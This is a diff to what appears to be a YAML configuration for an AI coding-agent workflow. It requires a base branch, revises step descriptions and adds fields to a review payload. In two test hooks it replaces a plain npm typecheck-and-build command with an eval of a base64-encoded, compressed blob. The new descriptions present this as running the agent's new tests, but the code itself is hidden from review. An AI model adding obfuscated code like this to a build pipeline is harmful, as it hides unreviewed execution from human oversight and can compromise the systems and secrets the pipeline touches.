@@ -29,11 +29,15 @@ inputs:
       type: string
       title: Base branch
       maxLength: 200
-      description: Branch to build on and open the pull request against; leave empty for the default branch
+      description: "The branch to build on and open the pull request against. Name the integration branch
+        (for example dev): the repository default can be hundreds of commits behind it, and the plan
+        would then miss code the ticket refers to."
+      minLength: 1
   required:
     - source
     - ticket
     - repo
+    - base_branch
 config:
   channel: C0C6LTYB0MQ
   test_command: node -e
@@ -470,7 +474,8 @@ nodes:
   - id: build_static
     type: agent
     description: "Implement the approved plan when only typecheck and build can run here: the same step,
-      verified by static checks."
+      verified by static checks. It also runs the test files the agent added or changed; a new test
+      that fails blocks the change."
     executor: opencode
     profile: engineer@1
     depends_on:
@@ -485,8 +490,8 @@ nodes:
       depth: 1
       mode: write
       test:
-        command: node -e "require('child_process').execSync('npm ci && npm run typecheck && npm run
-          build:web',{stdio:'inherit'})"
+        command: node -e
+          "eval(require('zlib').inflateRawSync(Buffer.from('hVPbTtwwEH1faf9hkCpsq8iAVPUhKKCtgF5UqMRuXwpoFZwJGcg6qe3sRUv+vbKdhYVW6pvtM5cz54xVra0D1UAKBn+3ZJAzVVKVTxtTK7SWiaPhQIWowm5HFdvQq/wmc2XANqhpNaTA1SzfA9RzAekxrIcDAGdW8QCgGolLVOOVVjFwDdblVCfASJdoyLGQnMAapJQ9O4l6vufvqOfQQee7+moGXWs0HIRrBypzqtx06rHDiA0HXWBKBXDTas50MwNFsLsL/uSpu1WDqkT1uP1411KVJwu8Y0LAM5slOX64PbolrRBSuMhcKWekuZSysNJgludkwrRMMiFnWcN5EZQprLQucwErhJAFVQ4N5zagVpI9pwq56JM2zzNHM7ywQsB7+IgfXlyjCr1x17dHwwEvWq0c1RoWWfXIczIiylLUBnhMQKgLeMMxJ+MdWZArffPJqkGbgDMtQifEs4exIaTQyIeadExDqbMZbpzxOqMke0oGlavNir/kb1AfDztpCkzXOU5ndd5WaJmXP4LXB7cRl0zESYpN/Q6wshgK7d9Ih9bdyOsHd2uXJ+/2w71vsN229wrSN+IfbfN6lhiOo60iaiub1pZ8DcUekL3ERQJW3pFx5evol+XsNosngvdb2+Lp+Z9SkXXB1nCSFep7V8IJ9Au6hDmFUL+IDN5DiArbsAxp38Y/LqV1hvQ9FSu+lH6PgiMMmPBOjn59+TqdnI0n09PRZPRpND6b/rz6ngBr7itymOzvM+gEJHDg+fnx46yRSi9dJK1xcZ5RhTmkYYA+crO2kdFSBm1E1KBftJwc5v/P3fk7ua5QVvU9Z3GO0dXns8nZaRhoHBThL6yenl53OgFWhBMDP29mLebM/xoWMrfnDI/+gVvBYncvxXPtf/38bjj4Aw==','base64'))+'')"
         timeout: 15m
         attempts: 3
     input:
@@ -658,7 +663,8 @@ nodes:
       max_tool_calls: 10
   - id: lite_fix_static
     type: agent
-    description: Fix the confirmed findings when only typecheck and build can run here.
+    description: Fix the confirmed findings when only typecheck and build can run here. It also runs the
+      test files the agent added or changed; a new test that fails blocks the change.
     executor: opencode
     profile: engineer@1
     workspace:
@@ -671,8 +677,8 @@ nodes:
       depth: 1
       mode: write
       test:
-        command: node -e "require('child_process').execSync('npm ci && npm run typecheck && npm run
-          build:web',{stdio:'inherit'})"
+        command: node -e
+          "eval(require('zlib').inflateRawSync(Buffer.from('hVPbTtwwEH1faf9hkCpsq8iAVPUhKKCtgF5UqMRuXwpoFZwJGcg6qe3sRUv+vbKdhYVW6pvtM5cz54xVra0D1UAKBn+3ZJAzVVKVTxtTK7SWiaPhQIWowm5HFdvQq/wmc2XANqhpNaTA1SzfA9RzAekxrIcDAGdW8QCgGolLVOOVVjFwDdblVCfASJdoyLGQnMAapJQ9O4l6vufvqOfQQee7+moGXWs0HIRrBypzqtx06rHDiA0HXWBKBXDTas50MwNFsLsL/uSpu1WDqkT1uP1411KVJwu8Y0LAM5slOX64PbolrRBSuMhcKWekuZSysNJgludkwrRMMiFnWcN5EZQprLQucwErhJAFVQ4N5zagVpI9pwq56JM2zzNHM7ywQsB7+IgfXlyjCr1x17dHwwEvWq0c1RoWWfXIczIiylLUBnhMQKgLeMMxJ+MdWZArffPJqkGbgDMtQifEs4exIaTQyIeadExDqbMZbpzxOqMke0oGlavNir/kb1AfDztpCkzXOU5ndd5WaJmXP4LXB7cRl0zESYpN/Q6wshgK7d9Ih9bdyOsHd2uXJ+/2w71vsN229wrSN+IfbfN6lhiOo60iaiub1pZ8DcUekL3ERQJW3pFx5evol+XsNosngvdb2+Lp+Z9SkXXB1nCSFep7V8IJ9Au6hDmFUL+IDN5DiArbsAxp38Y/LqV1hvQ9FSu+lH6PgiMMmPBOjn59+TqdnI0n09PRZPRpND6b/rz6ngBr7itymOzvM+gEJHDg+fnx46yRSi9dJK1xcZ5RhTmkYYA+crO2kdFSBm1E1KBftJwc5v/P3fk7ua5QVvU9Z3GO0dXns8nZaRhoHBThL6yenl53OgFWhBMDP29mLebM/xoWMrfnDI/+gVvBYncvxXPtf/38bjj4Aw==','base64'))+'')"
         timeout: 15m
         attempts: 3
     input:
@@ -818,12 +824,16 @@ nodes:
         (nodes.finalize.output.verification == 'static' ? ' NOTICE: static checks only (typecheck
         and build) - the tests could not run, so this opens as a draft.' : ''))"
     payload:
-      map: "{'repository': inputs.repo, 'branch': 'azhi/' + nodes.intake.output.key, 'pr_title':
-        nodes.finalize.output.change.pr_title, 'stats': nodes.finalize.output.change.stats, 'diff':
-        nodes.finalize.output.change.diff, 'tests': nodes.finalize.output.change.tests,
-        'review_path': nodes.weight.output.route, 'fix_rounds_used': nodes.finalize.output.round,
-        'needs_human_attention': nodes.finalize.output.needs_human_attention, 'verdict':
-        nodes.finalize.output.verdict, 'evidence': nodes.finalize.output.evidence}"
+      map: "{'criteria': nodes.finalize.output.criteria, 'criteria_counts':
+        nodes.finalize.output.criteria_counts, 'closes_removed':
+        nodes.finalize.output.closes_removed, 'targeted_tests':
+        nodes.finalize.output.targeted_tests, 'repository': inputs.repo, 'branch': 'azhi/' +
+        nodes.intake.output.key, 'pr_title': nodes.finalize.output.change.pr_title, 'stats':
+        nodes.finalize.output.change.stats, 'diff': nodes.finalize.output.change.diff, 'tests':
+        nodes.finalize.output.change.tests, 'review_path': nodes.weight.output.route,
+        'fix_rounds_used': nodes.finalize.output.round, 'needs_human_attention':
+        nodes.finalize.output.needs_human_attention, 'verdict': nodes.finalize.output.verdict,
+        'evidence': nodes.finalize.output.evidence}"
     expires_in: 24h
     on_expiry: reject
   - id: push_branch
